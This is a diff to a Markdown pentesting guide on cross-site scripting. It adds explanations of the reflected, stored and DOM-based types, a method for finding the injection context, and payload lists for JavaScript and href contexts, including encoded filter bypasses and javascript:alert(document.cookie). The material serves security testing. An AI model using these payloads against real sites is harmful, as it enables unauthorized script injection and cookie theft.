@@ -6,7 +6,11 @@
 
 Cross-Site Scripting (XSS) is a vulnerability that occurs when a web application includes user-controlled data in the page output without properly sanitizing it, allowing an attacker to **inject malicious JavaScript** that executes in the victim's browser.
 
-The impact depends on the XSS type: from simple proof-of-concept popups to full session hijacking, credential theft, or delivering malware to users. The most critical scenario is **Stored XSS**, where the payload is saved in the database and executes for every user who visits the affected page — including administrators.
+There are three types of XSS, each with a different persistence model and attack vector:
+
+- **Reflected XSS**: the payload is embedded in the request and reflected immediately in the response. It only affects users who click a crafted link. No server-side storage involved.
+- **Stored XSS**: the payload is saved in the database and rendered every time the affected page loads. It affects all users who visit it — including administrators — making it the most critical type.
+- **DOM-based XSS**: the payload never reaches the server. JavaScript on the client side reads from an attacker-controlled source (e.g. `location.hash`, `document.referrer`) and writes it into the DOM unsafely.
 
 ---
 
@@ -40,25 +44,50 @@ python3 xsser -u "http://domain.com/page.php?param=XSS" \
   --cookie="PHPSESSID=xxxx"
 ```
 
-### 📃 Identifying the context
+### 🔍 Step 1 — Identify the XSS type
 
-Before throwing payloads, it's essential to understand **where the input lands in the HTML**. Inject this test string and inspect the source code:
+Inject a unique, harmless string into every input point and track where it appears:
+
+```
+xsstest123
+```
+
+```
+Does it appear in the immediate HTTP response (Burp → Response tab)?
+  YES → REFLECTED XSS → the input is echoed back directly
+
+Does it not appear in the response, but shows up on another page
+  (comments section, profile, admin panel)?
+  YES → STORED XSS → the input was saved and is rendered elsewhere
+
+Does the page behavior change without the string reaching the server
+  (visible in Burp but not in the server-side response)?
+  YES → DOM-BASED XSS → client-side JavaScript is writing it into the DOM
+```
+
+### 📃 Step 2 — Identify the context
+
+Once the type is known, inject this test string and inspect the **page source** to find where the input lands in the HTML:
 
 ```
 TEST"><img/src=x>
 ```
 
-The position of the string in the response tells us the context we're working in:
-
 ```
-1️⃣ HTML CONTEXT    → appears as plain text inside a tag
+1️⃣ HTML CONTEXT       → appears as plain text inside a tag
    Example: <p>TEST"><img/src=x></p>
 
-2️⃣ ATTRIBUTE CONTEXT → appears inside an HTML attribute
+2️⃣ ATTRIBUTE CONTEXT  → appears inside an HTML attribute
    Example: <input value="TEST"><img/src=x>">
+
+3️⃣ JAVASCRIPT CONTEXT → appears inside a <script> block
+   Example: <script>var q = 'TEST';</script>
+
+4️⃣ HREF/SRC CONTEXT   → appears inside a href or src attribute
+   Example: <a href="TEST">
 ```
 
-The context determines which payloads will work, so this step must always come first.
+The context determines which payloads will work. Both steps must always be done before attempting exploitation.
 
 ---
 
@@ -146,6 +175,45 @@ The input lands inside an HTML attribute value. The goal is to **break out of th
 <!-- Double encoding -->
 %2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
 %2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
+```
+
+### 3️⃣ JavaScript Context
+
+The input lands inside an existing `<script>` block. There's no need to inject new HTML tags — the goal is to **break out of the string** and inject JavaScript directly:
+
+#### Basic payloads
+
+```javascript
+';alert(1)//
+"-alert(1)-"
+'+alert(1)+'
+'-alert(1)-'
+`-alert(1)-`
+```
+
+#### ✋🏻 Bypasses
+
+When quote characters are filtered:
+
+```javascript
+// Use backticks instead of quotes
+`-alert(1)-`
+
+// Hex encoding
+\x3cscript\x3ealert(1)\x3c/script\x3e
+```
+
+---
+
+### 4️⃣ href / src Context
+
+The input is placed inside a `href` or `src` attribute. The browser will execute the value of `href` as JavaScript if the `javascript:` scheme is used:
+
+#### Basic payloads
+
+```
+javascript:alert('XSS')
+javascript:alert(document.cookie)
 ```
 
 ---
